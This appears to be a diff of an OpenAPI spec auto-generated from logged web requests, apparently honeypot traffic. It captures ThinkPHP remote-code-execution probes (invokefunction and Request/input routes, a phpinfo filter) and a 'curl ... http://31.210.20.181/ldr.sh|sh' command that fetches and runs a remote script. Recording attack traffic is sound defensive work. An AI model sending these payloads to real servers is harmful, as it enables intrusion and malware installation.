@@ -212,7 +212,8 @@
       "required": false,
       "schema": {
        "enum": [
-        "/Index/\\think\\app/invokefunction"
+        "/Index/\\think\\app/invokefunction",
+        "index/\\think\\Request/input"
        ],
        "type": "string"
       }
@@ -228,6 +229,28 @@
         "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh",
         "md5",
         "__HelloThinkPHP"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "data",
+      "required": false,
+      "schema": {
+       "enum": [
+        "1"
+       ],
+       "type": "string"
+      }
+     },
+     {
+      "in": "query",
+      "name": "filter",
+      "required": false,
+      "schema": {
+       "enum": [
+        "phpinfo"
        ],
        "type": "string"
       }
@@ -431,7 +454,7 @@
       "description": "OK"
      }
     },
-    "summary": "Seen 1618944 requests"
+    "summary": "Seen 1618950 requests"
    },
    "head": {
     "operationId": "2c63f690-a7d8-4dd9-9a0b-458671cd3ec5",
@@ -2133,13 +2156,13 @@
       "description": "OK"
      }
     },
-    "summary": "Seen 264 requests",
+    "summary": "Seen 265 requests",
     "tags": [
      "index.html"
     ]
    },
    "head": {
-    "operationId": "bdef365d-2829-4f74-995b-61216a7265b6",
+    "operationId": "35a73788-1db8-43fb-8b09-ef4fc3fa898d",
     "parameters": [],
     "responses": {
      "200": {
@@ -2225,6 +2248,24 @@
      }
     },
     "summary": "Seen 909 requests"
+   },
+   "parameters": []
+  },
+  "/metrics": {
+   "get": {
+    "operationId": "6b353a57-d795-424a-ad3f-e35c176c96f1",
+    "parameters": [],
+    "responses": {
+     "200": {
+      "content": {
+       "text/plain": {
+        "example": null
+       }
+      },
+      "description": "OK"
+     }
+    },
+    "summary": "Seen 2 requests"
    },
    "parameters": []
   },
@@ -3222,7 +3263,7 @@
   },
   "/{param}/../index.html": {
    "get": {
-    "operationId": "129cb6aa-174e-4f71-8459-656e25b85bf5",
+    "operationId": "796c6b78-8caa-4176-b18e-5fb5adf25d88",
     "parameters": [],
     "responses": {
      "200": {
@@ -3255,7 +3296,7 @@
  },
  "tags": [
   {
-   "name": "orders"
+   "name": "customers"
   },
   {
    "name": "index.html"
@@ -3267,7 +3308,7 @@
    "name": "cart"
   },
   {
-   "name": "customers"
+   "name": "orders"
   }
  ]
 }
